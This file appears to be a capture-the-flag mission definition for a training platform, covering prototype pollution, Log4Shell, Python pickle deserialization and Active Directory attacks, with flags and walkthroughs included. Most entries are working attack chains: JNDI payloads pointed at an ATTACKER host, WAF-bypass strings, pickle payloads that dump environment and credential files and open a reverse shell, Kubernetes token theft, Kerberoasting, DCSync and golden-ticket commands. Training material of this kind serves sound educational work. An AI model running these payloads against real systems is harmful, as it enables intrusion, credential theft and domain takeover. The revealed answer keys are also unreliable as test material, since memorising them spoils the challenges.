          '# Handlebars RCE via prototype pollution (CVE-2019-19919):',
          '{"__proto__":{"pendingContent":"{{#with \\"s\\" as |string|}}...{{/with}}"}}',
          '# lodash.merge or defaults affected: npm audit shows "Prototype Pollution in lodash"',
          '# Check: require(\'lodash\').VERSION — versions <4.17.21 are vulnerable',
        ],
        notes:'Use npm audit or Snyk to identify specific vulnerable library versions before exploiting.'
      },
    ],
    lab:'Deep merge does not exclude __proto__/constructor — Object.prototype mutated server-side.',
    hints:[
      'JS prototype chain: every object inherits from Object.prototype.',
      'Pollute __proto__.isAdmin = true to grant ambient admin.',
      'Flag = prototype_pollution_<role-granted>.'
    ],
    verification:[
      'Confirm using a fresh request with no auth header — if isAdmin is still true, pollution persisted across requests.',
      'Use Object.freeze(Object.prototype) as a mitigation test — re-run exploit after to confirm it is blocked.',
      'Run npm audit on the target package.json — identify which library (lodash, deepmerge, etc.) is affected.',
    ],
    walkthrough:'POST __proto__ key in JSON; deep merge writes to Object.prototype.\nFlag = `prototype_pollution_admin`.'
  },

  // ──────────────────────────────────────────────────────────
  //  TIER 4 — CLASSIFIED  (r10–r12)
  // ──────────────────────────────────────────────────────────

  {
    id:'r10', tier:'classified', skill:'DESERIALIZATION', points:600, solves:91,
    title:'Log4Shell — JNDI Injection RCE',
    requires:['r08'],
    mitre:['T1190','T1059.007'],
    cve:'CVE-2021-44228',
    flagHash:'783efd4f7b42aae1e8bcb1325d0ca906be45b3df56e6688d277418aeac4203c1',
    brief:'Submit a User-Agent that triggers a JNDI lookup in a log4j2 <2.15 backend. Stand up a malicious LDAP server, deliver a serialized payload, achieve RCE.',
    scenario:[
      '# 1. Start LDAP/HTTP server with marshalsec or JNDI-Exploit-Kit',
      'java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Exploit"',
      '# 2. Serve malicious Java class',
      'python3 -m http.server 8888',
      '# 3. Send the payload',
      'curl -H "User-Agent: ${jndi:ldap://ATTACKER:1389/Exploit}" https://target/search',
      '# 4. Observe RCE on attacker listener',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Identify log4j2 Version',
        desc:'Confirm the Java app is running log4j2 < 2.15.0 via error pages, headers, or jar listing.',
        tools:[
          '# Via HTTP response headers:',
          'curl -I https://target/ | grep -i "x-powered-by\\|server"',
          '# Via OOB detection (safe): send JNDI to DNS-only callback',
          'curl -H "User-Agent: ${jndi:dns://oob.interactsh.com/test}" https://target/search',
          '# If DNS hit received, log4j is evaluating lookups → likely vulnerable',
        ],
        notes:'Safe detection: use DNS-only (not LDAP) callback so no deserialization occurs until confirmed.'
      },
      {
        step:2, name:'Identify All Injection Vectors',
        desc:'JNDI lookups are evaluated in ANY logged field — headers, params, JSON body.',
        tools:[
          '# Common injection points:',
          'curl -H "X-Forwarded-For: ${jndi:dns://oob.interactsh.com/xff}" https://target/',
          'curl -H "X-Api-Version: ${jndi:dns://oob.interactsh.com/ver}" https://target/',
          'curl https://target/search?q=${jndi:dns://oob.interactsh.com/q}',
          '# Also try WAF bypass obfuscation:',
          '# ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://...}',
        ],
        notes:'log4j2 evaluates lookups deeply nested. WAFs blocking "jndi" can be bypassed via obfuscation.'
      },
      {
        step:3, name:'Stand Up Malicious LDAP Server',
        desc:'Use JNDI-Exploit-Kit or marshalsec to serve a reference to a malicious Java class.',
        tools:[
          '# JNDI-Exploit-Kit (simpler):',
          'git clone https://github.com/pimps/JNDI-Exploit-Kit',
          'java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -rmi 1099 -ldap 1389 \\',
          '  -http 8888 -cmd "curl http://ATTACKER/rce_confirm"',
          '',
          '# Or marshalsec:',
          'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Exploit"',
        ],
        notes:'The LDAP server redirects the victim JVM to fetch a Java .class file from HTTP server.'
      },
      {
        step:4, name:'Deliver JNDI Payload',
        desc:'Send the triggering request. Victim JVM fetches and deserializes the attacker class.',
        tools:[
          'curl -H "User-Agent: ${jndi:ldap://ATTACKER:1389/Exploit}" https://target/search',
          '# Or with URL encoding:',
          'curl -H "User-Agent: %24%7Bjndi%3Aldap%3A%2F%2FATTACKER%3A1389%2FExploit%7D" https://target/search',
        ],
        notes:'The payload executes in the context of the JVM process user (often root in Docker/k8s).'
      },
      {
        step:5, name:'Post-Exploitation in Container Context',
        desc:'Most Java apps run in containers — enumerate for cluster escape vectors.',
        tools:[
          'cat /proc/1/cgroup | grep docker  # Confirm container',
          'cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null  # k8s service account',
          'curl -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" \\',
          '  https://kubernetes.default.svc/api/v1/namespaces/default/secrets',
          'env | grep -i "kube\\|aws\\|secret\\|pass\\|key"',
        ],
        notes:'k8s service account tokens can list/read secrets if RBAC is misconfigured.'
      },
    ],
    lab:'log4j2 (<2.15) evaluates ${jndi:...} substitution in all logged strings including HTTP headers.',
    hints:[
      'The vulnerability has a famous nickname (same as this mission title).',
      'It abuses ${jndi:...} substitution evaluated inside the logging framework.',
      'Flag = log4shell_<protocol1>_<protocol2>.'
    ],
    verification:[
      'DNS-only OOB: confirm DNS callback before LDAP delivery — safer detection first.',
      'Check CVE-2021-45046 (bypass for the 2.15 fix) — test with ${${::-j}${::-n}${::-d}${::-i}:ldap://...}',
      'Post-fix verification: upgrade to log4j2 ≥ 2.17.1 and re-run DNS probe — no callback = patched.',
    ],
    walkthrough:'Detect via DNS OOB. Stand up LDAP+HTTP servers. Inject ${jndi:ldap://...} in User-Agent.\nFlag = `log4shell_jndi_ldap`.'
  },

  {
    id:'r11', tier:'classified', skill:'DESERIALIZATION', points:700, solves:54,
    title:'Python Pickle Deserialization RCE',
    requires:['r10'],
    mitre:['T1059.006','T1190'],
    flagHash:'6c677216168ca563a187aabc8b74c13f3766a59dc9fa87a280fc9bbb0eea0a8e',
    brief:'A Python Flask service base64-decodes a "session" cookie and feeds it directly into pickle.loads(). Craft a __reduce__ payload for RCE, then escalate to a reverse shell.',
    scenario:[
      'import pickle, base64, os',
      '',
      'class RCE:',
      '    def __reduce__(self):',
      '        return (os.system, ("curl http://ATTACKER/rce_confirmed",))',
      '',
      'payload = base64.b64encode(pickle.dumps(RCE())).decode()',
      'curl -b "session=$payload" https://target/api/me',
      '> server executes: curl http://ATTACKER/rce_confirmed',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Identify Pickle Serialization',
        desc:'Detect pickle usage via base64-encoded cookies or upload endpoints.',
        tools:[
          '# Decode the session cookie:',
          'echo "$SESSION_COOKIE" | base64 -d | python3 -c "import sys,pickle; pickle.loads(sys.stdin.buffer.read())"',
          '# If it unpickles to a Python object (dict, tuple) → pickle is in use',
          '# Distinguish from JWT (three dot-separated segments) and Flask-signing (signature after dot)',
        ],
        notes:'Python pickle magic bytes start with \\x80\\x04 (protocol 4) or \\x80\\x02. Detectable in base64.'
      },
      {
        step:2, name:'Craft Safe Proof-of-Concept Payload',
        desc:'Use a time-delay or DNS callback to confirm blind RCE before destructive actions.',
        tools:[
          'python3 -c "',
          'import pickle, base64, os',
          'class SafeProbe:',
          '    def __reduce__(self):',
          '        # Time-based: sleep 5',
          '        return (os.system, ("sleep 5",))',
          'print(base64.b64encode(pickle.dumps(SafeProbe())).decode())',
          '"',
          '',
          '# Send and measure response time:',
          'time curl -b "session=$(python3 poc.py)" https://target/api/me',
        ],
        notes:'Always start with a safe, observable payload (sleep, DNS) before executing destructive commands.'
      },
      {
        step:3, name:'OOB Exfiltration for Blind Confirmation',
        desc:'Use curl/wget callback to confirm code execution without timing.',
        tools:[
          'python3 -c "',
          'import pickle, base64, os',
          'class OOB:',
          '    def __reduce__(self):',
          '        return (os.system, ("curl http://oob.interactsh.com/pickle_rce",))',
          'print(base64.b64encode(pickle.dumps(OOB())).decode())',
          '"',
        ],
        notes:'interactsh-client on attacker box logs the HTTP request — confirms RCE with no timing ambiguity.'
      },
      {
        step:4, name:'Exfiltrate Credentials and Environment',
        desc:'Extract /etc/passwd, environment variables, and application config.',
        tools:[
          'python3 -c "',
          'import pickle, base64, subprocess',
          'class Exfil:',
          '    def __reduce__(self):',
          '        cmd = "env && cat /etc/passwd && find / -name .env 2>/dev/null | xargs cat 2>/dev/null"',
          '        return (subprocess.check_output, (["/bin/sh","-c",cmd],))',
          'print(base64.b64encode(pickle.dumps(Exfil())).decode())',
          '"',
        ],
        notes:'Use subprocess.check_output to capture stdout back in the HTTP response body.'
      },
      {
        step:5, name:'Reverse Shell via Pickle',
        desc:'Upgrade to interactive reverse shell for full post-exploitation.',
        tools:[
          'python3 -c "',
          'import pickle, base64, os',
          'class Shell:',
          '    def __reduce__(self):',
          '        cmd = "python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])\'"',
          '        return (os.system, (cmd,))',
          'print(base64.b64encode(pickle.dumps(Shell())).decode())',
          '"',
          '',
          '# Attacker: nc -lvnp 4444',
        ],
        notes:'ONLY on authorized ranges. Reverse shells must terminate after the exercise.'
      },
    ],
    lab:'pickle.loads() on attacker-controlled base64 cookie = unconditional RCE.',
    hints:[
      'Python\'s native object serializer is the vulnerable codec.',
      'Format: deserialize_<codec>',
      'It rhymes with "tickle".'
    ],
    verification:[
      'Safe verification: sleep 5 payload with time measurement — ≥5s response delta confirms RCE.',
      'OOB: interactsh DNS/HTTP hit confirms without timing ambiguity.',
      'Read response body: use subprocess.check_output to return command output inline in the HTTP response.',
    ],
    walkthrough:'Craft __reduce__ payload returning (os.system, (cmd,)). Base64-encode and send as session cookie.\nFlag = `deserialize_pickle`.'
  },

  {
    id:'r12', tier:'classified', skill:'AD_OFFENSE', points:850, solves:31,
    title:'Kerberoasting + AS-REP Roasting + DCSync',
    requires:['r11'],
    mitre:['T1558.003','T1558.004','T1003.006'],
    flagHash:'a6a258efbe8b43b96df99b5cd4d92988f408dcf748060c10fec9b7ffd6c815bb',
    brief:'On a domain-joined host with low-priv credentials, enumerate all SPN accounts (Kerberoast), find accounts with no pre-auth required (AS-REP roast), crack offline, then escalate to Domain Admin via DCSync.',
    scenario:[
      '# Phase 1: Kerberoast',
      'Rubeus.exe kerberoast /user:svc-sql /outfile:krb.txt',
      'hashcat -m 13100 krb.txt rockyou.txt → svc-sql:Summer2025!',
      '',
      '# Phase 2: AS-REP Roast (no pre-auth)',
      'GetNPUsers.py fllc.local/alice:pass -usersfile users.txt -format hashcat -outputfile asrep.txt',
      'hashcat -m 18200 asrep.txt rockyou.txt → svc-backup:Password1!',
      '',
      '# Phase 3: DCSync via secretsdump',
      "secretsdump.py fllc.local/svc-backup:'Password1!'@dc01.fllc.local -just-dc",
      '> krbtgt:502:aad3b435...  Administrator:500:...',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Enumerate SPN-Registered Service Accounts',
        desc:'List all accounts with ServicePrincipalName set — these are Kerberoastable.',
        tools:[
          '# PowerView:',
          'Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,description',
          '',
          '# Impacket (from Linux):',
          'GetUserSPNs.py fllc.local/alice:pass -dc-ip 10.10.10.1 -request -outputfile spns.txt',
          '',
          '# Native LDAP query:',
          'ldapsearch -H ldap://dc01.fllc.local -D "alice@fllc.local" -w pass \\',
          '  -b "DC=fllc,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName',
        ],
        notes:'Service accounts with weak passwords are the most impactful targets. Prioritize DA-delegated accounts.'
      },
      {
        step:2, name:'Request and Export TGS Tickets',
        desc:'Request Kerberos TGS for each SPN account. The ticket contains encrypted hash material crackable offline.',
        tools:[
          '# Rubeus (Windows):',
          'Rubeus.exe kerberoast /stats              # Show SPN count and encryption types',
          'Rubeus.exe kerberoast /rc4opsec /outfile:tgs.txt  # Only RC4-encrypted (faster to crack)',
          '',
          '# Impacket (Linux):',
          'GetUserSPNs.py fllc.local/alice:pass -dc-ip 10.10.10.1 -request-user svc-sql -outputfile svc-sql.tgs',
        ],
        notes:'Prefer RC4 (etype 23) over AES256 (etype 18) — RC4 is orders of magnitude faster to crack.'
      },
      {
        step:3, name:'AS-REP Roasting — Accounts Without Pre-Auth',
        desc:'Accounts with DONT_REQUIRE_PREAUTH allow unauthenticated TGT requests — hash returnable to any requester.',
        tools:[
          '# Impacket (no credentials needed):',
          'GetNPUsers.py fllc.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.10.10.1',
          '',
          '# Rubeus (Windows):',
          'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
          '',
          '# Enumerate pre-auth disabled via PowerView:',
          'Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname',
        ],
        notes:'AS-REP hashes use hashcat mode 18200 (-m 18200). Often weaker passwords than SPN accounts.'
      },
      {
        step:4, name:'Offline Password Cracking',
        desc:'Crack TGS and AS-REP hashes offline using wordlist + rules.',
        tools:[
          '# Kerberoast (TGS) hashes — mode 13100:',
          'hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule',
          '',
          '# AS-REP hashes — mode 18200:',
          'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/d3ad0ne.rule',
          '',
          '# Also try: hashcat -m 13100 tgs.txt -a 3 ?u?l?l?l?d?d?d?d  (mask attack for common patterns)',
        ],
        notes:'Common service account password patterns: SeasonYYYY!, CompanyName123, ServiceName@123.'
      },
      {
        step:5, name:'DCSync — Full Domain Credential Dump',
        desc:'Use a cracked account with Replication rights (or DA) to pull all NTLM hashes from the DC.',
        tools:[
          '# Impacket secretsdump:',
          "secretsdump.py fllc.local/svc-backup:'Summer2025!'@dc01.fllc.local -just-dc -outputfile dc_dump",
          '',
          '# Mimikatz (Windows, requires DA or replication rights):',
          'lsadump::dcsync /domain:fllc.local /all /csv',
          '',
          '# Pass-the-Hash with dumped Administrator NTLM:',
          "psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH fllc.local/Administrator@dc01.fllc.local cmd.exe",
          '',
          '# Golden Ticket from krbtgt hash:',
          'ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain fllc.local anyuser',
          'export KRB5CCNAME=anyuser.ccache',
          'psexec.py -k -no-pass fllc.local/anyuser@dc01.fllc.local',
        ],
        notes:'DCSync = full domain compromise. krbtgt hash → Golden Ticket = persistent admin. Most severe finding.'
      },
    ],
    lab:'Service accounts with weak passwords + SPN registration + replication rights → domain compromise.',
    hints:[
      'Technique name comes from the protocol (Kerberos) + roast suffix.',
      'Escalation path: SPN account → crack → replication rights → DCSync → krbtgt.',
      'Flag = ad_<technique>_<account-prefix>.'
    ],
    verification:[
      'Validate cracked password: crackmapexec smb dc01.fllc.local -u svc-sql -p "Summer2025!" → [+] (Pwn3d!)',
      'Confirm replication rights: Get-ObjectAcl -Identity "DC=fllc,DC=local" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|ExtendedRight"}',
      'Post-DCSync: verify krbtgt hash by generating a golden ticket and accessing DC resources.',
      'Enumerate trust relationships: Get-DomainTrust — inter-domain trusts extend the blast radius.',
    ],
    walkthrough:'Enumerate SPNs → Kerberoast → crack offline → use creds for DCSync → dump krbtgt hash.\nFlag = `ad_kerberoast_svc`.'
  }
];
